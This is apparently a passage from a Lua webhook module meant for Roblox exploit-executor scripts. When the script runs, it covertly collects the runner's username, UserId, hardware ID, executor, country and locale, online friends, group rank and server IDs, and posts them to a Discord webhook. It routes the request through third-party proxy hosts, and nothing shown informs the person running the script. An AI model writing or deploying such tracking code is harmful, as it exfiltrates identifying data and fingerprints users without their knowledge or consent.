-- ============================================================
-- TRANSPORT
-- ============================================================
-- Discord rejects Roblox's user-agent, so the same webhook path is retried
-- through mirror hosts. Order matters; the first host that 2xxes wins.
-- Mirror operators see the full payload and your webhook URL -- use a
-- throwaway webhook.
local PROXY_HOSTS = {
    "https://discord.com",
    "https://hooks.hyra.io",
    "https://webhook.lewisakura.moe",
}

local function webhookPath(url)
    local path = url:match("^https?://[^/]+(/.+)$")
    return path or url
end

local function rawPost(url, body)
    if type(syn) == "table" and type(syn.request) == "function" then
        local ok, res = pcall(function()
            return syn.request({
                Url = url, Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
        if ok and res and (res.statusCode or res.StatusCode) then
            return tonumber(res.statusCode or res.StatusCode), res.body or res.Body
        end
        if ok and res and res.success then return 200, "" end
    end

    if type(request) == "function" then
        local ok, res = pcall(function()
            return request({
                Url = url, Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
        if ok and res and (res.StatusCode or res.statusCode) then
            return tonumber(res.StatusCode or res.statusCode), res.Body or res.body
        end
        if ok and res and res.Success then return 200, res.Body or "" end
    end

    if HttpService and HttpService.RequestAsync then
        local ok, res = pcall(function()
            return HttpService:RequestAsync({
                Url = url, Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
        if ok and res then return res.StatusCode, res.Body end
    end

    return nil, nil
end

local function post(url, body)
    if not Webhook.UseProxy then
        local st = rawPost(url, body)
        return st ~= nil and st >= 200 and st < 300, st
    end
    local path = webhookPath(url)
    for _, host in ipairs(PROXY_HOSTS) do
        local st, resp = rawPost(host .. path, body)
        if st ~= nil and st >= 200 and st < 300 then
            return true, st
        end
        if st == 401 or st == 404 then return false, st, resp end
    end
    return false, nil
end

-- ============================================================
-- SAFE HELPERS
-- ============================================================
local function tryGet(_, fn)
    local ok, v = pcall(fn)
    if not ok or v == nil then return nil end
    if type(v) == "string" and #v == 0 then return nil end
    return v
end

local function membershipName(plr)
    local mt = plr and plr.MembershipType
    if mt == nil then return "?" end
    local ok, n = pcall(function() return mt.Name end)
    if ok and type(n) == "string" then return n end
    local byVal = { [0] = "None", [1] = "NBC", [2] = "Premium", [3] = "TBC", [4] = "Premium" }
    return byVal[tonumber(mt) or 0] or tostring(mt)
end

local function friendsOnline()
    local plr = Players.LocalPlayer
    if not plr then return nil end
    local ok, list = pcall(function() return plr:GetFriendsOnline(20) end)
    if not ok or type(list) ~= "table" or #list == 0 then return nil end
    local ids = {}
    for i, v in ipairs(list) do ids[i] = tostring(v) end
    return table.concat(ids, ", ")
end

-- ============================================================
-- HWID
-- ============================================================
local function getHWID()
    local candidates = { "gethwid", "get_hwid", "getHwid", "HWID", "getHWID" }
    for _, name in ipairs(candidates) do
        if type(_G[name]) == "function" then
            local ok, v = pcall(_G[name])
            if ok and type(v) == "string" and #v > 0 then return v, name end
        end
    end
    if type(syn) == "table" and type(syn.get_hwid) == "function" then
        local ok, v = pcall(syn.get_hwid)
        if ok and type(v) == "string" and #v > 0 then return v, "syn.get_hwid" end
    end
    if RbxAnal then
        local ok, v = pcall(function() return RbxAnal:GetClientId() end)
        if ok and type(v) == "string" and #v > 0 then
            return v, "RbxAnalyticsService"
        end
    end
    return "unknown", "none"
end

-- ============================================================
-- EXECUTOR
-- ============================================================
local function getExecutor()
    if type(identifyexecutor) == "function" then
        local ok, n, v = pcall(identifyexecutor)
        if ok and type(n) == "string" then
            return (type(v) == "string" and v ~= "" and (n .. " " .. v) or n)
        end
    end
    if type(getexecutorname) == "function" then
        local ok, n = pcall(getexecutorname)
        if ok and type(n) == "string" then return n end
    end
    if type(syn) == "table" and type(syn.getexecutorname) == "function" then
        local ok, n = pcall(syn.getexecutorname)
        if ok and type(n) == "string" and n ~= "" then return n end
    end
    return "Unknown"
end

-- ============================================================
-- MARKETPLACE
-- ============================================================
local function gameInfo()
    local ok, info = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    if not ok or type(info) ~= "table" then return nil end
    local parts = {}
    if info.Name    then parts[#parts+1] = info.Name end
    if info.Creator then parts[#parts+1] = "by " .. tostring(info.Creator.Name or "?") end
    if info.Updated then parts[#parts+1] = "updated " .. tostring(info.Updated) end
    if info.PriceInRobux ~= nil then
        parts[#parts+1] = "price " .. tostring(info.PriceInRobux) .. " R$"
    end
    if info.IsOwned   ~= nil then parts[#parts+1] = "owned: "   .. tostring(info.IsOwned)   end
    if info.IsForSale ~= nil then parts[#parts+1] = "for sale: " .. tostring(info.IsForSale) end
    if #parts == 0 then return nil end
    return table.concat(parts, "  •  ")
end

-- ============================================================
-- EMBED
-- ============================================================
local function field(name, value, inline)
    return { name = name, value = tostring(value or "?"), inline = inline ~= false }
end

local function buildPayload()
    local plr = Players.LocalPlayer
    if not plr then return nil end

    local hwid, hwidSrc = getHWID()
    local execName      = getExecutor()
    local mem           = membershipName(plr)
    local country       = tryGet("cc", function() return plr.CountryCode end)
    local locale        = tryGet("loc", function() return plr.LocaleId end)
    local team          = plr.Team and plr.Team.Name or "-"
    local friends       = friendsOnline()
    local priv          = tryGet("priv", function() return game.PrivateServerId end)
    local privOwner     = tryGet("privOwner", function() return game.PrivateServerOwnerId end)
    local placeVer      = tryGet("ver", function() return game.PlaceVersion end)
    local gameId        = tryGet("gid", function() return game.GameId end)
    local mkt           = gameInfo()
    local rank          = tryGet("rank", function() return plr:GetRankInGroup(1) end)
    local role          = tryGet("role", function() return plr:GetRoleInGroup(1) end)

    local f = {}
    f[#f+1] = field("User",
        "```" .. plr.Name .. "  (" .. plr.DisplayName .. ")```", false)
    f[#f+1] = field("UserId", plr.UserId)
    f[#f+1] = field("Account Age", plr.AccountAge .. " days")
    f[#f+1] = field("Membership", mem)
    f[#f+1] = field("Country / Locale", (country or "?") .. "  /  " .. (locale or "?"))
    f[#f+1] = field("Team", team)
    f[#f+1] = field("Neutral", tostring(plr.Neutral))
    if friends then f[#f+1] = field("Friends Online (<=20)", friends) end
    if rank or role then
        f[#f+1] = field("Group 1",
            (rank and tostring(rank) or "?") .. "  /  " .. (role or "?"))
    end

    f[#f+1] = field("HWID", "```" .. hwid .. "```", false)
    f[#f+1] = field("HWID Source", hwidSrc)

    f[#f+1] = field("Executor", execName)

    f[#f+1] = field("Game", "```" .. game.Name .. "```", false)
    f[#f+1] = field("PlaceId", tostring(game.PlaceId))
    if placeVer then f[#f+1] = field("PlaceVersion", tostring(placeVer)) end
    if gameId   then f[#f+1] = field("GameId",       tostring(gameId))   end
    f[#f+1] = field("JobId", "```" .. tostring(game.JobId) .. "```", false)
    f[#f+1] = field("Private Server",
        priv and ("yes  •  id " .. tostring(priv) ..
                  (privOwner and ("  •  owner " .. tostring(privOwner)) or ""))
        or "no")
    if mkt then f[#f+1] = field("Marketplace", mkt, false) end

    f[#f+1] = field("Time UTC", os.date("!%Y-%m-%dT%H:%M:%SZ"))

    return HttpService:JSONEncode({
        embeds = { {
            title       = "script executed - " .. plr.Name,
            description = "```" .. plr.DisplayName .. " just ran the script```",
            type        = "rich",
            color       = Webhook.EmbedColor,
            fields      = f,
            thumbnail   = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId="
                      .. tostring(plr.UserId) .. "&width=420&height=420&format=png",
            },
            footer      = { text = Webhook.FooterText },
            timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        } },
    })
end

-- ============================================================
-- INIT
-- ============================================================
local fired = false

function Webhook:Init()
    if not Webhook.Enabled or fired then return false end
    fired = true

    if Webhook.URL:find("ID/TOKEN", 1, true) then
        warn("[webhook] URL not configured, skipping")
        return false
    end

    task.spawn(function()
        for _ = 1, 60 do
            if Players.LocalPlayer then break end
            task.wait(0.1)
        end
        if not Players.LocalPlayer then return end

        local okEnc, body = pcall(buildPayload)
        if not okEnc or type(body) ~= "string" then
            warn("[webhook] payload build failed")
            return
        end

        local ok, status = post(Webhook.URL, body)
        if not ok then
            warn("[webhook] send failed, status: " .. tostring(status))
        end
    end)

    return true
end

return Webhook
